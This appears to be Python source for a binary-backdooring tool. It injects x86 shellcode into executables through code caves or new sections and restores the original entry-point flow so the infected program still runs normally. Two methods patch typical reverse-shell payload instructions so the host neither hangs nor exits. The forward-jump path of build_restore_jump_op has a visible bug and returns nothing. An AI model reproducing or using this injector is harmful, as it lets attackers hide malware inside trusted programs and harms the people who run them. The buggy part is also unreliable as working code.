from __future__ import annotations
from typing import List, Any
import sys
from struct import pack
from binascii import hexlify

from capstone import Cs, CS_ARCH_X86, CS_MODE_32

from inject.enums import (
    EXTRA_SIZE_TO_RESTORE,
    IX86_PUSHAD,
    IX86_PUSHFD,
    IX86_POPAD,
    IX86_JUMP,
    IX86_NOP,
    X86OP,
)

from inject.utils import printhexi, byteslash, intbyte


# TODO: encapsulare restoration in it's own class
class Shellcode:
    def __init__(self, shellcode: bytes, options: dict = None):
        options = options or {}
        self.original_shellcode = shellcode
        self.shellcode = shellcode
        self.restore_data: bytes = None
        self.restore_jump_to_address: int = -1
        self.restore_cave_address: int = -1
        self.restore_ep_relative: int = -1  # should be original, not new-section
        self.restore_nop_data: bool = options.get("nop_restore_data", False)
        # options
        self.cave = options.get("cave", "auto")  # auto, cave, new-section
        self.enter = options.get("enter", "jump")  # jump, new-section
        self.should_restore = options.get("should_restore", True)
        self.log_level = int(options.get("log_level", 1))

    def get_final_size(self):
        _restore_size = EXTRA_SIZE_TO_RESTORE if self.should_restore else 0
        return len(self.shellcode) + _restore_size

    def get_size_when_restoring(self):
        self.restore_data_required()

        return (
            len(self.shellcode)
            + len(IX86_PUSHAD)
            + len(IX86_POPAD)
            + len(self.restore_data)
            + len(IX86_JUMP)  # jump backs
        )

    def generate(self) -> bytes:
        # assumes certain payload, need better way
        self.fix_wait_for_single_object()
        self.fix_call_ebp_closes_program()

        if self.should_restore:
            self.out("-- Restoring --")
            self.check_restore_requirements()
            size_when_restoring = self.get_size_when_restoring()
            self.out(f"[*] Shellcode Size When Restoring: {size_when_restoring}")
            self.outhexi(f"Restore Cave Address", self.restore_cave_address)
            restore_current_address = self.restore_cave_address + size_when_restoring

            if self.restore_nop_data:
                self.out(f"[*] Replacing Restoration data with NOPs")
                self.restore_data = IX86_NOP * len(self.restore_data)
            else:
                restore_ep_relative = self.restore_ep_relative
                original_restore_data = self.restore_data
                self.restore_data = self.generate_relative_restore_data(
                    original_restore_data, restore_current_address
                )
                added_bytes = len(self.restore_data) - len(original_restore_data)
                restore_current_address = restore_current_address + added_bytes
                if added_bytes > 0:
                    self.out(f"[*] Adding {added_bytes} to Current Address")

            self.outhexi(f"Restore Current Address", restore_current_address)
            self.outhexi(f"Restore New Entry Address", self.restore_jump_to_address)
            jmp_op = self.build_restore_jump_op(restore_current_address)

            self.shellcode = (
                IX86_PUSHAD + self.shellcode + IX86_POPAD + self.restore_data + jmp_op
            )
            # self.outins(self.get_ins_from_data(self.shellcode, take=-1))

        return self.shellcode

    def build_restore_jump_op(self, current_address):
        jump_to_address = self.restore_jump_to_address
        # go backwards
        if jump_to_address < current_address:
            new_entry_loc = (current_address + 5 - jump_to_address) * -1
            self.outhexi(f"Final Jump To Address (Back)", new_entry_loc)
            return IX86_JUMP + pack("=l", new_entry_loc)
        # go forwards
        new_entry_loc = current_address + 5 - jump_to_address
        self.outhexi(f"Final Jump To Address (Forward)", new_entry_loc)
        jmp_op = IX86_JUMP + pack("=L", new_entry_loc)

    def generate_relative_restore_data(self, data: bytes, current_address) -> bytes:
        corrected_data = bytes()
        added_bytes = 0
        current_offset = 0
        prior_offset = 0
        ins = self.get_ins_from_data(data, offset=self.restore_ep_relative)
        for i in ins:
            asm = "%s %s" % (i.mnemonic, i.op_str)
            prior_offset = current_offset
            current_offset += len(i.bytes)
            original_jump_op = data[
                prior_offset:current_offset
            ]  # grab current instruction bytes

            opcode = intbyte(original_jump_op[0])  # extract first opcode byte
            if X86OP.knows_value(opcode):
                self.out(f"[*] Restoration Instruction: {asm}")
                op = X86OP(opcode)
                if op.is_jmp_call() and op.is_short():
                    self.out(
                        f"[*] Changing JMP/CALL {op.name} to short version {op.deshort().name}"
                    )
                    op = op.deshort()
                current_address = current_address + added_bytes
                if op.is_jmp_call():
                    intended = int(
                        asm.split(" ")[1], 16
                    )  # get the intended destination
                    self.outhexi(f"Original Intended Destination", intended)
                    op_offset = 5
                    if op.is_conditional_jmp_call():
                        op_offset = 6
                    jump_address = self.calc_updated_restore_jump_location(
                        intended, current_address, op_offset
                    )
                    self.outhexi(f"New Intended Destination", jump_address)
                    jump_op = bytes(op) + pack("=l", jump_address)
                    self.out(
                        f"[*] Original Jump/Call Operation: {byteslash(original_jump_op)}",
                    )
                    self.out(f"[*] New Jump/Call Operation: {byteslash(jump_op)}",)

                else:
                    jump_op = original_jump_op
            else:
                self.out(f"[*] Skipping restoration opcode: '{byteslash(opcode)}'",)

                jump_op = original_jump_op

            corrected_data += jump_op
            added_bytes += len(jump_op) - len(original_jump_op)

        return corrected_data

    def calc_updated_restore_jump_location(self, intended, current_address, offset):
        # backwards
        if intended < current_address:
            self.out(f"[*] Retoration direction: backwards")
            return (current_address - intended + offset) * -1
        # forwards
        self.out(f"[*] Retoration direction: forwards")
        return current_address - intended + offset  # forwards jump

    def check_restore_requirements(self):
        self.restore_data_required()
        self.restore_jump_to_address_required()
        self.restore_cave_address_required()
        self.restore_cave_address_required()

    def set_restore_data(self, restore_data: bytes):
        self.restore_data = restore_data

    def restore_data_required(self):
        if not self.restore_data:
            print(
                "[!] Restore data not known. Cannot restore. Either tell Shellcode the restore data or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def set_restore_jump_to_address(self, jump_to_addr: int):
        self.restore_jump_to_address = jump_to_addr

    def restore_jump_to_address_required(self):
        if not self.restore_jump_to_address >= 0:
            print(
                "[!] Return Jump To Address is not known by Shellcode instance. Cannot restore. Either tell Shellcode the jump to address or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def set_restore_cave_address(self, cave_address: int):
        self.restore_cave_address = cave_address

    def restore_cave_address_required(self):

        if not self.restore_cave_address >= 0:
            print(
                "[!] Return Cave Address is not known by Shellcode instance. Cannot restore. Either tell Shellcode the cave address or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def set_restore_ep_relative(self, ep_ava):
        self.restore_ep_relative = ep_ava

    def restore_restore_ep_relative_required(self):

        if not self.restore_ep_relative >= 0:
            print(
                "[!] Restore relative entrypoint (ep_ava) is not known by Shellcode instance. Cannot restore. Either tell Shellcode the ep or disable restoration."
            )
            print("[!] Injection failed.")
            sys.exit(1)

    def __bytes__(self):
        return self.generate()

    def out(self, *msgs, level: int = 1, writer=None):
        if level >= self.log_level:
            if writer:
                writer(*msgs)
            else:
                print(*msgs)

    def outhexi(self, *msgs, level: int = 1):
        self.out(*msgs, level=level, writer=printhexi)

    def outins(self, ins: List[Any], level: int = 1):
        if level >= self.log_level:
            for i in ins:
                print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

    def get_ins_from_data(self, data: bytes, take: int = 8, offset: int = -1):
        offset = offset if offset >= 0 else 0x1000
        c = 0
        ins = []
        for i in Cs(CS_ARCH_X86, CS_MODE_32).disasm(data, offset):
            ins.append(i)
            if take != -1 and c >= take:
                return ins
            c += 1
        return ins

    # TODO: fix this, bad way to tell payload
    def fix_call_ebp_closes_program(self):
        self.out("-- Fixing Closing ShellCode --")
        nsc = bytes()
        ins = self.get_ins_from_data(self.shellcode, take=-1)
        candidates = ins[len(ins) - 3 :]  # get last three
        if f"{candidates[0].mnemonic} {candidates[0].op_str}" == "push 0":
            if f"{candidates[1].mnemonic} {candidates[1].op_str}" == "push ebx":
                if f"{candidates[2].mnemonic} {candidates[2].op_str}" == "call ebp":
                    k = 0
                    for i in ins:
                        if k == len(ins) - 1:
                            self.out("[*] Removing 'call ebp' instruction")
                            nsc = nsc + IX86_NOP * len(i.bytes)
                        else:
                            nsc = nsc + i.bytes
                        k += 1
                    self.shellcode = nsc

    # TODO: fix this, bad way to tell payload
    def fix_wait_for_single_object(self):
        print("-- Fixing Hanging ShellCode --")
        nsc = bytes()
        one_matched = False
        two_matched = False
        k = 0
        for i in self.get_ins_from_data(self.shellcode, take=-1):
            if f"{i.mnemonic} {i.op_str}" == "call ebp":
                one_matched = k
            if f"{i.mnemonic} {i.op_str}" == "mov eax, esp" and one_matched == k - 1:
                two_matched = k
            if f"{i.mnemonic} {i.op_str}" == "dec esi" and two_matched == k - 1:
                self.out("[*] Removing 'dec esi' instruction")
                nsc = nsc + IX86_NOP * len(i.bytes)
            else:
                nsc = nsc + i.bytes
            k += 1
        self.shellcode = nsc
